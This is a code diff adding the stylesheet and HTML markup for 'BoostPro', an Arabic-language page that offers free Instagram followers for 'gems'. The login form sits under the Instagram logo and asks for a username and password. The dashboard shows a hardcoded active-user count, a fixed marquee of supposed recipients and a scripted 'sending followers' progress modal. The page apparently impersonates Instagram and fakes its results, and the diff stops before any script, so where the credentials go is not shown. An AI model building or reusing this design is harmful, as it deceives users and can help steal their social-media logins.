+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 14px;
+  padding: 15px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.profile-menu-item:hover {
+  background: rgba(255,255,255,0.06);
+  border-color: rgba(108,99,255,0.2);
+}
+
+.profile-menu-item .left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.profile-menu-item .icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+  background: rgba(108,99,255,0.15);
+  color: var(--primary);
+}
+
+.profile-menu-item .text {
+  font-size: 0.9rem;
+  font-weight: 600;
+}
+
+.profile-menu-item .arrow {  color: var(--text-dim);
+  transition: transform 0.3s;
+}
+
+.profile-menu-item:hover .arrow {
+  transform: translateX(-5px);
+}
+
+.logout-btn {
+  width: 100%;
+  padding: 14px;
+  background: rgba(255,23,68,0.1);
+  border: 1px solid rgba(255,23,68,0.2);
+  border-radius: 14px;
+  color: var(--danger);
+  font-size: 0.9rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+  margin-top: 15px;
+}
+
+.logout-btn:hover {
+  background: rgba(255,23,68,0.2);
+}
+
+/* Processing Modal */
+.processing-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.85);
+  backdrop-filter: blur(15px);
+  z-index: 9000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.processing-modal.active {
+  display: flex;
+}
+
+.processing-card {
+  background: linear-gradient(145deg, #1a1a2e, #16213e);
+  border: 1px solid rgba(255,255,255,0.1);  border-radius: 24px;
+  padding: 40px 30px;
+  max-width: 400px;
+  width: 100%;
+  text-align: center;
+  animation: modalPop 0.5s ease;
+}
+
+.processing-spinner {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 25px;
+  position: relative;
+}
+
+.spinner-ring {
+  position: absolute;
+  inset: 0;
+  border-radius: 50%;
+  border: 3px solid transparent;
+}
+
+.spinner-ring:nth-child(1) {
+  border-top-color: var(--primary);
+  animation: spin 1s linear infinite;
+}
+
+.spinner-ring:nth-child(2) {
+  inset: 8px;
+  border-right-color: var(--accent);
+  animation: spin 1.5s linear infinite reverse;
+}
+
+.spinner-ring:nth-child(3) {
+  inset: 16px;
+  border-bottom-color: var(--gold);
+  animation: spin 2s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.processing-title {
+  font-size: 1.2rem;
+  font-weight: 700;
+  margin-bottom: 8px;
+  color: white;
+}
+.processing-subtitle {
+  font-size: 0.85rem;
+  color: var(--text-dim);
+  margin-bottom: 25px;
+}
+
+.processing-steps {
+  text-align: right;
+}
+
+.processing-step {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 0;
+  font-size: 0.85rem;
+  color: var(--text-dim);
+  transition: all 0.5s;
+}
+
+.processing-step.active {
+  color: var(--primary);
+}
+
+.processing-step.done {
+  color: var(--success);
+}
+
+.step-icon {
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.7rem;
+  flex-shrink: 0;
+  background: rgba(255,255,255,0.05);
+  transition: all 0.5s;
+}
+
+.processing-step.active .step-icon {
+  background: rgba(108,99,255,0.2);
+  color: var(--primary);
+}
+
+.processing-step.done .step-icon {
+  background: rgba(0,200,83,0.2);
+  color: var(--success);
+}
+/* Success Modal */
+.success-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.85);
+  backdrop-filter: blur(15px);
+  z-index: 9000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.success-modal.active {
+  display: flex;
+}
+
+.success-card {
+  background: linear-gradient(145deg, #1a1a2e, #16213e);
+  border: 1px solid rgba(0,200,83,0.2);
+  border-radius: 24px;
+  padding: 40px 30px;
+  max-width: 400px;
+  width: 100%;
+  text-align: center;
+  animation: modalPop 0.5s ease;
+}
+
+.success-icon {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 20px;
+  background: rgba(0,200,83,0.15);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2.5rem;
+  animation: successPop 0.5s ease 0.3s both;
+}
+
+@keyframes successPop {
+  from { transform: scale(0); }
+  to { transform: scale(1); }
+}
+.confetti {
+  position: absolute;
+  width: 8px;
+  height: 8px;
+  border-radius: 2px;
+  animation: confettiFall 3s ease-in-out infinite;
+}
+
+@keyframes confettiFall {
+  0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+  100% { transform: translateY(400px) rotate(720deg); opacity: 0; }
+}
+
+/* Notification Toast */
+.toast {
+  position: fixed;
+  top: 80px;
+  left: 50%;
+  transform: translateX(-50%) translateY(-100px);
+  background: rgba(26,26,46,0.95);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 14px;
+  padding: 14px 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  z-index: 8000;
+  transition: transform 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+  min-width: 280px;
+}
+
+.toast.show {
+  transform: translateX(-50%) translateY(0);
+}
+
+.toast-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.toast.success .toast-icon { background: rgba(0,200,83,0.15); color: var(--success); }
+.toast.error .toast-icon { background: rgba(255,23,68,0.15); color: var(--danger); }
+.toast.info .toast-icon { background: rgba(108,99,255,0.15); color: var(--primary); }
+.toast-content h4 {
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: white;
+}
+
+.toast-content p {
+  font-size: 0.75rem;
+  color: var(--text-dim);
+}
+
+/* Scrollbar */
+::-webkit-scrollbar {
+  width: 4px;
+}
+
+::-webkit-scrollbar-track {
+  background: transparent;
+}
+
+::-webkit-scrollbar-thumb {
+  background: rgba(108,99,255,0.3);
+  border-radius: 2px;
+}
+
+/* Responsive */
+@media (max-width: 400px) {
+  .stats-grid {
+    grid-template-columns: 1fr;
+  }
+  .gem-options {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  .store-grid {
+    grid-template-columns: 1fr;
+  }
+  .quick-actions {
+    grid-template-columns: repeat(2, 1fr);
+  }
+}
+
+/* Animations for elements */
+.animate-in {
+  opacity: 0;
+  transform: translateY(20px);
+  animation: animateIn 0.6s ease forwards;
+}
+
+.animate-in:nth-child(1) { animation-delay: 0.1s; }
+.animate-in:nth-child(2) { animation-delay: 0.2s; }.animate-in:nth-child(3) { animation-delay: 0.3s; }
+.animate-in:nth-child(4) { animation-delay: 0.4s; }
+
+@keyframes animateIn {
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* Counter animation */
+.counter {
+  display: inline-block;
+}
+
+/* Glow effects */
+.glow-primary {
+  box-shadow: 0 0 30px rgba(108,99,255,0.2);
+}
+
+.glow-gold {
+  box-shadow: 0 0 30px rgba(255,215,61,0.2);
+}
+
+/* Online indicator */
+.online-dot {
+  width: 8px;
+  height: 8px;
+  background: var(--success);
+  border-radius: 50%;
+  display: inline-block;
+  animation: pulse 2s infinite;
+  margin-left: 5px;
+}
+
+/* Verification badge */
+.verified {
+  color: var(--primary);
+  margin-right: 5px;
+}
+
+/* Transaction History */
+.transaction-item {
+  background: var(--glass);
+  border: 1px solid rgba(255,255,255,0.06);
+  border-radius: 14px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 8px;
+  transition: all 0.3s;
+}
+.transaction-item:hover {
+  background: rgba(255,255,255,0.06);
+}
+
+.transaction-info {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.transaction-icon {
+  width: 36px;
+  height: 36px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1rem;
+}
+
+.transaction-icon.income { background: rgba(0,200,83,0.15); color: var(--success); }
+.transaction-icon.expense { background: rgba(255,23,68,0.15); color: var(--danger); }
+
+.transaction-details h4 {
+  font-size: 0.85rem;
+  font-weight: 600;
+  color: white;
+}
+
+.transaction-details p {
+  font-size: 0.7rem;
+  color: var(--text-dim);
+}
+
+.transaction-amount {
+  font-weight: 700;
+  font-size: 0.9rem;
+}
+
+.transaction-amount.positive { color: var(--success); }
+.transaction-amount.negative { color: var(--danger); }
+
+/* Referral Section */
+.referral-card {
+  background: linear-gradient(135deg, rgba(108,99,255,0.15), rgba(78,205,196,0.15));
+  border: 1px solid rgba(108,99,255,0.2);
+  border-radius: 18px;
+  padding: 20px;
+  margin-bottom: 20px;  position: relative;
+  overflow: hidden;
+}
+
+.referral-card::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  right: -50%;
+  width: 100%;
+  height: 100%;
+  background: radial-gradient(circle, rgba(108,99,255,0.1) 0%, transparent 70%);
+}
+
+.referral-card h3 {
+  font-size: 1rem;
+  font-weight: 700;
+  margin-bottom: 8px;
+  position: relative;
+}
+
+.referral-card p {
+  font-size: 0.8rem;
+  color: var(--text-dim);
+  margin-bottom: 15px;
+  position: relative;
+}
+
+.referral-code {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  position: relative;
+}
+
+.referral-code input {
+  flex: 1;
+  padding: 10px 14px;
+  background: rgba(0,0,0,0.3);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 10px;
+  color: white;
+  font-size: 0.85rem;
+  font-family: 'Tajawal', monospace;
+  outline: none;
+}
+
+.copy-btn {
+  padding: 10px 16px;
+  background: var(--gradient-1);  border: none;
+  border-radius: 10px;
+  color: white;
+  font-size: 0.8rem;
+  font-weight: 700;
+  font-family: 'Tajawal', sans-serif;
+  cursor: pointer;
+  transition: all 0.3s;
+}
+
+.copy-btn:hover {
+  transform: translateY(-2px);
+}
+
+/* Dark overlay for processing */
+.dark-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.5);
+  z-index: 4000;
+  display: none;
+}
+
+/* Shimmer effect */
+.shimmer {
+  background: linear-gradient(90deg, 
+    rgba(255,255,255,0) 0%, 
+    rgba(255,255,255,0.05) 50%, 
+    rgba(255,255,255,0) 100%);
+  background-size: 200% 100%;
+  animation: shimmer 2s infinite;
+}
+
+@keyframes shimmer {
+  0% { background-position: -200% 0; }
+  100% { background-position: 200% 0; }
+}
+
+/* Live counter */
+.live-counter {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  padding: 10px;
+  background: rgba(0,200,83,0.08);
+  border: 1px solid rgba(0,200,83,0.15);
+  border-radius: 12px;
+  margin-bottom: 20px;
+  font-size: 0.8rem;  color: var(--success);
+}
+
+.live-dot {
+  width: 6px;
+  height: 6px;
+  background: var(--success);
+  border-radius: 50%;
+  animation: pulse 1.5s infinite;
+}
+
+/* Notification Badge */
+.notif-badge {
+  position: absolute;
+  top: -5px;
+  right: -5px;
+  min-width: 18px;
+  height: 18px;
+  background: var(--danger);
+  border-radius: 9px;
+  font-size: 0.6rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  padding: 0 5px;
+}
+
+/* Skeleton loading */
+.skeleton {
+  background: linear-gradient(90deg, 
+    rgba(255,255,255,0.05) 25%, 
+    rgba(255,255,255,0.1) 50%, 
+    rgba(255,255,255,0.05) 75%);
+  background-size: 200% 100%;
+  animation: skeletonLoad 1.5s infinite;
+  border-radius: 8px;
+}
+
+@keyframes skeletonLoad {
+  0% { background-position: 200% 0; }
+  100% { background-position: -200% 0; }
+}
+
+/* Floating action button */
+.fab {
+  position: fixed;
+  bottom: 85px;
+  left: 20px;  width: 50px;
+  height: 50px;
+  background: var(--gradient-1);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  z-index: 50;
+  box-shadow: 0 5px 20px rgba(108,99,255,0.4);
+  transition: all 0.3s;
+  border: none;
+  color: white;
+  font-size: 1.2rem;
+}
+
+.fab:hover {
+  transform: scale(1.1) rotate(90deg);
+}
+
+/* Tooltip */
+.tooltip {
+  position: relative;
+}
+
+.tooltip::after {
+  content: attr(data-tooltip);
+  position: absolute;
+  bottom: 100%;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0,0,0,0.9);
+  color: white;
+  padding: 6px 12px;
+  border-radius: 8px;
+  font-size: 0.7rem;
+  white-space: nowrap;
+  opacity: 0;
+  visibility: hidden;
+  transition: all 0.3s;
+}
+
+.tooltip:hover::after {
+  opacity: 1;
+  visibility: visible;
+  bottom: calc(100% + 8px);
+}
+
+/* Ripple effect */
+.ripple {  position: relative;
+  overflow: hidden;
+}
+
+.ripple::after {
+  content: '';
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  pointer-events: none;
+  background-image: radial-gradient(circle, rgba(255,255,255,0.15) 10%, transparent 10%);
+  background-repeat: no-repeat;
+  background-position: 50%;
+  transform: scale(10, 10);
+  opacity: 0;
+  transition: transform 0.5s, opacity 0.8s;
+}
+
+.ripple:active::after {
+  transform: scale(0, 0);
+  opacity: 0.3;
+  transition: 0s;
+}
+
+/* Price tag */
+.price-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  padding: 4px 10px;
+  background: rgba(255,215,61,0.1);
+  border: 1px solid rgba(255,215,61,0.2);
+  border-radius: 8px;
+  font-size: 0.75rem;
+  color: var(--gold);
+  font-weight: 600;
+}
+
+/* Status bar */
+.status-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 14px;
+  background: rgba(0,200,83,0.08);
+  border: 1px solid rgba(0,200,83,0.15);
+  border-radius: 10px;
+  margin-bottom: 20px;  font-size: 0.75rem;
+  color: var(--success);
+}
+
+/* Custom Select */
+.custom-select {
+  position: relative;
+  width: 100%;
+}
+
+.custom-select select {
+  width: 100%;
+  padding: 14px 18px;
+  background: rgba(255,255,255,0.05);
+  border: 1px solid rgba(255,255,255,0.1);
+  border-radius: 14px;
+  color: white;
+  font-size: 0.95rem;
+  font-family: 'Tajawal', sans-serif;
+  outline: none;
+  appearance: none;
+  cursor: pointer;
+}
+
+.custom-select::after {
+  content: '';
+  position: absolute;
+  left: 15px;
+  top: 50%;
+  transform: translateY(-50%);
+  border: 5px solid transparent;
+  border-top-color: var(--text-dim);
+}
+
+/* Range slider */
+.range-slider {
+  width: 100%;
+  margin: 10px 0;
+}
+
+.range-slider input[type="range"] {
+  -webkit-appearance: none;
+  width: 100%;
+  height: 6px;
+  background: rgba(255,255,255,0.1);
+  border-radius: 3px;
+  outline: none;
+}
+
+.range-slider input[type="range"]::-webkit-slider-thumb {  -webkit-appearance: none;
+  width: 22px;
+  height: 22px;
+  background: var(--gradient-1);
+  border-radius: 50%;
+  cursor: pointer;
+  box-shadow: 0 0 10px rgba(108,99,255,0.4);
+}
+
+.range-value {
+  text-align: center;
+  font-size: 1.5rem;
+  font-weight: 800;
+  color: var(--gold);
+  margin-bottom: 5px;
+}
+
+/* Activity feed */
+.activity-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.04);
+}
+
+.activity-item:last-child {
+  border-bottom: none;
+}
+
+.activity-avatar {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  background: var(--gradient-1);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: white;
+  flex-shrink: 0;
+}
+
+.activity-text {
+  flex: 1;
+}
+
+.activity-text p {
+  font-size: 0.8rem;  color: var(--text);
+}
+
+.activity-text span {
+  font-size: 0.7rem;
+  color: var(--text-dim);
+}
+
+.activity-amount {
+  font-weight: 700;
+  font-size: 0.85rem;
+  color: var(--success);
+}
+
+/* Empty state */
+.empty-state {
+  text-align: center;
+  padding: 40px 20px;
+}
+
+.empty-state .icon {
+  font-size: 3rem;
+  margin-bottom: 15px;
+  opacity: 0.3;
+}
+
+.empty-state h3 {
+  font-size: 1rem;
+  font-weight: 700;
+  margin-bottom: 8px;
+}
+
+.empty-state p {
+  font-size: 0.8rem;
+  color: var(--text-dim);
+}
+
+/* Marquee */
+.marquee-container {
+  overflow: hidden;
+  background: rgba(108,99,255,0.05);
+  border: 1px solid rgba(108,99,255,0.1);
+  border-radius: 10px;
+  padding: 10px 0;
+  margin-bottom: 20px;
+}
+
+.marquee {
+  display: flex;
+  animation: marquee 30s linear infinite;  white-space: nowrap;
+}
+
+.marquee-item {
+  padding: 0 30px;
+  font-size: 0.8rem;
+  color: var(--text-dim);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.marquee-item .dot {
+  width: 4px;
+  height: 4px;
+  background: var(--primary);
+  border-radius: 50%;
+}
+
+@keyframes marquee {
+  0% { transform: translateX(0); }
+  100% { transform: translateX(-50%); }
+}
+
+/* Progress bar */
+.progress-bar {
+  width: 100%;
+  height: 8px;
+  background: rgba(255,255,255,0.08);
+  border-radius: 4px;
+  overflow: hidden;
+  margin: 10px 0;
+}
+
+.progress-bar .fill {
+  height: 100%;
+  background: var(--gradient-1);
+  border-radius: 4px;
+  transition: width 0.5s;
+}
+
+/* Tag */
+.tag {
+  display: inline-block;
+  padding: 3px 8px;
+  border-radius: 6px;
+  font-size: 0.65rem;
+  font-weight: 700;
+}
+.tag.new { background: rgba(0,200,83,0.15); color: var(--success); }
+.tag.hot { background: rgba(255,107,107,0.15); color: var(--secondary); }
+.tag.free { background: rgba(255,215,61,0.15); color: var(--gold); }
+
+/* Watermark */
+.watermark {
+  position: fixed;
+  bottom: 75px;
+  right: 20px;
+  font-size: 0.6rem;
+  color: rgba(255,255,255,0.1);
+  z-index: 50;
+  pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<!-- Background Animation -->
+<div class="bg-animation">
+  <div class="orb"></div>
+  <div class="orb"></div>
+  <div class="orb"></div>
+  <div class="orb"></div>
+</div>
+<div class="grid-overlay"></div>
+<div class="particles" id="particles"></div>
+
+<!-- Loading Screen -->
+<div class="loading-screen" id="loadingScreen">
+  <div class="loader-logo">BoostPro</div>
+  <div class="loader-bar-container">
+    <div class="loader-bar"></div>
+  </div>
+  <div class="loader-text">جاري تحميل النظام...</div>
+</div>
+
+<!-- Login Page -->
+<div class="login-page" id="loginPage">
+  <div class="login-container">
+    <div class="login-card">
+      <div class="login-header">
+        <div class="login-logo">
+          <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+        </div>
+        <h1 class="login-title">BoostPro</h1>
+        <p class="login-subtitle">اضافة متابعين وتفاعلات انستقرام</p>
+      </div>
+
+      <form class="login-form" id="loginForm">        <div class="input-group">
+          <label>اسم المستخدم</label>
+          <input type="text" id="loginUsername" placeholder="ادخل اسم المستخدم" required autocomplete="off">
+          <span class="input-icon">@</span>
+        </div>
+        <div class="input-group">
+          <label>كلمة المرور</label>
+          <input type="password" id="loginPassword" placeholder="ادخل كلمة المرور" required>
+          <span class="input-icon">&#128274;</span>
+        </div>
+        <button type="submit" class="login-btn ripple">
+          <span class="btn-shine"></span>
+          تسجيل الدخول
+        </button>
+      </form>
+
+      <div class="login-footer">
+        <p>خدمة مجانية لزيادة متابعين انستقرام</p>
+        <span class="badge">
+          <span class="online-dot"></span>
+          متوفر الان
+        </span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Welcome Gift Modal -->
+<div class="modal-overlay" id="welcomeModal">
+  <div class="modal-content">
+    <div class="gift-icon">&#127873;</div>
+    <h2>مرحبا بك في BoostPro!</h2>
+    <p>بمناسبة تسجيلك لأول مرة، تحصل على هدية ترحيبية</p>
+    <div class="gem-amount">+200 جوهرة</div>
+    <p style="font-size: 0.75rem; color: var(--text-dim);">كل 10 جواهر = متابع واحد<br>يمكنك استخدام الجواهر في زيادة متابعينك</p>
+    <button class="modal-btn" onclick="claimGift()">استلام الهدية</button>
+  </div>
+</div>
+
+<!-- Processing Modal -->
+<div class="processing-modal" id="processingModal">
+  <div class="processing-card">
+    <div class="processing-spinner">
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+      <div class="spinner-ring"></div>
+    </div>
+    <h3 class="processing-title">جاري تحويل المتابعين</h3>
+    <p class="processing-subtitle" id="processingTarget"></p>
+    <div class="processing-steps">      <div class="processing-step" id="step1">
+        <span class="step-icon">1</span>
+        <span>التحقق من الحساب</span>
+      </div>
+      <div class="processing-step" id="step2">
+        <span class="step-icon">2</span>
+        <span>ربط الخوادم</span>
+      </div>
+      <div class="processing-step" id="step3">
+        <span class="step-icon">3</span>
+        <span>ارسال المتابعين</span>
+      </div>
+      <div class="processing-step" id="step4">
+        <span class="step-icon">4</span>
+        <span>تأكيد العملية</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Success Modal -->
+<div class="success-modal" id="successModal">
+  <div class="success-card">
+    <div class="success-icon">&#10003;</div>
+    <h2 style="color: white; margin-bottom: 10px;">تمت العملية بنجاح!</h2>
+    <p style="color: var(--text-dim); margin-bottom: 20px;" id="successMessage"></p>
+    <div class="progress-bar" style="margin-bottom: 15px;">
+      <div class="fill" id="successFill" style="width: 100%;"></div>
+    </div>
+    <button class="modal-btn" onclick="closeSuccess()">حسنا</button>
+  </div>
+</div>
+
+<!-- Toast Notification -->
+<div class="toast" id="toast">
+  <div class="toast-icon"></div>
+  <div class="toast-content">
+    <h4 id="toastTitle"></h4>
+    <p id="toastMessage"></p>
+  </div>
+</div>
+
+<!-- Main App -->
+<div class="app-container" id="appContainer">
+  
+  <!-- Top Navigation -->
+  <nav class="top-nav">
+    <div class="nav-brand">
+      <div class="nav-brand-icon">B</div>
+      <span class="nav-brand-text">BoostPro</span>    </div>
+    <div class="nav-gems" onclick="navigateTo('store')">
+      <span class="gem-icon">&#9830;</span>
+      <span class="gem-count" id="navGemCount">0</span>
+    </div>
+    <div class="nav-user" onclick="navigateTo('profile')">
+      <div class="user-avatar" id="navAvatar">U</div>
+    </div>
+  </nav>
+
+  <!-- Dashboard Page -->
+  <div class="page active" id="pageDashboard">
+    <div class="welcome-section">
+      <h1>مرحبا، <span id="dashUsername">المستخدم</span></h1>
+      <p>مرحباً بك في لوحة التحكم</p>
+    </div>
+
+    <!-- Live Counter -->
+    <div class="live-counter">
+      <span class="live-dot"></span>
+      <span id="liveCount">1,247</span> مستخدم نشط الان
+    </div>
+
+    <!-- Marquee -->
+    <div class="marquee-container">
+      <div class="marquee" id="marquee">
+        <div class="marquee-item"><span class="dot"></span> s***r حصل على 500 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> a***d حصل على 200 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> m***a حصل على 1000 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> k***y حصل على 300 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> r***n حصل على 150 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> f***s حصل على 800 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> s***r حصل على 500 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> a***d حصل على 200 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> m***a حصل على 1000 متابع</div>
+        <div class="marquee-item"><span class="dot"></span> k***y حصل على 300 متابع</div>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-grid">
+      <div class="stat-card animate-in">
+        <div class="stat-icon">&#9830;</div>
+        <div class="stat-value" id="statGems">200</div>
+        <div class="stat-label">الجواهر المتوفرة</div>
+      </div>
+      <div class="stat-card animate-in">
+        <div class="stat-icon">&#128101;</div>
+        <div class="stat-value" id="statFollowers">0</div>
+        <div class="stat-label">متابعين تم ارسالهم</div>      </div>
+      <div class="stat-card animate-in">
+        <div class="stat-icon">&#128200;</div>
+        <div class="stat-value" id="statOrders">0</div>
+        <div class="stat-label">الطلبات المكتملة</div>
+      </div>
+      <div class="stat-card animate-in">
+        <div class="stat-icon">&#11088;</div>
+        <div class="stat-value" id="statLevel">1</div>
+        <div class="stat-label">المستوى</div>
+      </div>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="section-title"><span>اجراءات سريعة</span></div>
+    <div class="quick-actions">
+      <div class="action-card ripple" onclick="navigateTo('boost')">
+        <div class="action-icon purple">&#128640;</div>
+        <div class="action-label">زيادة متابعين</div>
+      </div>
+      <div class="action-card ripple" onclick="navigateTo('store')">
+        <div class="action-icon gold">&#128142;</div>
+        <div class="action-label">شراء جواهر</div>
+      </div>
+      <div class="action-card ripple" onclick="navigateTo('history')">
+        <div class="action-icon teal">&#128203;</div>
+        <div class="action-label">السجل</div>
+      </div>
+    </div>
+
+    <!-- Referral -->
+    <div class="referral-card">
+      <h3>ادعو اصدقائك واربح</h3>
+      <p>شارك كود الدعوة واحصل على 50 جوهرة لكل صديق يسجل</p>
+      <div class="referral-code">
+        <input type="text" id="referralCode" value="" readonly>
+        <button class="copy-btn" onclick="copyReferral()">نسخ</button>
+      </div>
+    </div>
+
+    <!-- Tips -->
+    <div class="tips-section">
+      <div class="section-title"><span>نصائح مهمة</span></div>
+      <div class="tip-card">
+        <div class="tip-icon">&#128161;</div>
+        <div class="tip-content">
+          <h4>كيف تزيد جواهرهك؟</h4>
+          <p>يمكنك شراء جواهر من المتجر او دعوة اصدقائك للحصول على جواهر مجانية</p>
+        </div>
+      </div>      <div class="tip-card">
+        <div class="tip-icon">&#9889;</div>
+        <div class="tip-content">
+          <h4>سرعة التحويل</h4>
+          <p>يتم تحويل المتابعين خلال دقائق قليلة بعد تأكيد الطلب</p>
+        </div>
+      </div>
+      <div class="tip-card">
+        <div class="tip-icon">&#128274;</div>
+        <div class="tip-content">
+          <h4>امان حسابك</h4>
+          <p>نظامنا لا يتطلب كلمة مرور حسابك الانستقرام - فقط اسم المستخدم</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Boost Page -->
+  <div class="page" id="pageBoost">
+    <div class="boost-page">
+      <div class="section-title" style="margin-bottom: 20px;"><span>زيادة متابعين</span></div>
+
+      <div class="boost-card">
+        <div class="boost-input-group">
+          <label>اسم المستخدم على انستقرام</label>
+          <input type="text" class="boost-input" id="boostUsername" placeholder="example_user" autocomplete="off">
+        </div>
+
+        <div class="gem-selector">
+          <label>اختر عدد الجواهر (كل 10 جواهر = متابع واحد)</label>
+          <div class="gem-options">
+            <div class="gem-option" data-gems="10" data-followers="1" onclick="selectGemOption(this)">
+              <div class="gem-option-value">10</div>
+              <div class="gem-option-label">جوهرة</div>
+              <div class="gem-option-price">= 1 متابع</div>
+            </div>
+            <div class="gem-option" data-gems="50" data-followers="5" onclick="selectGemOption(this)">
+              <div class="gem-option-value">50</div>
+              <div class="gem-option-label">جوهرة</div>
+              <div class="gem-option-price">= 5 متابعين</div>
+            </div>
+            <div class="gem-option selected" data-gems="100" data-followers="10" onclick="selectGemOption(this)">
+              <div class="gem-option-value">100</div>
+              <div class="gem-option-label">جوهرة</div>
+              <div class="gem-option-price">= 10 متابعين</div>
+            </div>
+            <div class="gem-option" data-gems="200" data-followers="20" onclick="selectGemOption(this)">
+              <div class="gem-option-value">200</div>
+              <div class="gem-option-label">جوهرة</div>
+              <div class="gem-option-price">= 20 متابع</div>            </div>
+            <div class="gem-option" data-gems="500" data-followers="50" onclick="selectGemOption(this)">
+              <div class="gem-option-value">500</div>
+              <div class="gem-option-label">جوهرة</div>
+              <div class="gem-option-price">= 50 متابع</div>
+            </div>
+            <div class="gem-option" data-gems="1000" data-followers="100" onclick="selectGemOption(this)">
+              <div class="gem-option-value">1000</div>
+              <div class="gem-option-label">جوهرة</div>
+              <div class="gem-option-price">= 100 متابع</div>
+            </div>
+          </div>
+        </div>
+
+        <div style="background: rgba(255,215,61,0.08); border: 1px solid rgba(255,215,61,0.15); border-radius: 12px; padding: 12px; margin-bottom: 15px;">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <span style="font-size: 0.85rem; color: var(--text);">جواهر متوفرة:</span>
